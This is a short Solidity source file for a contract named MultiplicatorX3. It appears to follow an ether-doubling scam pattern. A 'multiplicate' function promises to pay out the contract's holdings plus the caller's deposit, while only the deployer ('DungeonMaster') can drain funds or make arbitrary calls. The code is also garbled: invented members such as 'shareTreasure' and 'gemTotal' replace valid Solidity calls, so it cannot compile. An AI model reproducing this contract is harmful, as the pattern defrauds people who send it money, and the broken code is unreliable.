// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public DungeonMaster = msg.sender;

    function() public payable{}

    function takePrize()
    payable
    public
    {
        require(msg.sender == DungeonMaster);
        DungeonMaster.shareTreasure(this.gemTotal);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DungeonMaster);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.gemTotal)
        {
            adr.shareTreasure(this.gemTotal+msg.value);
        }
    }
}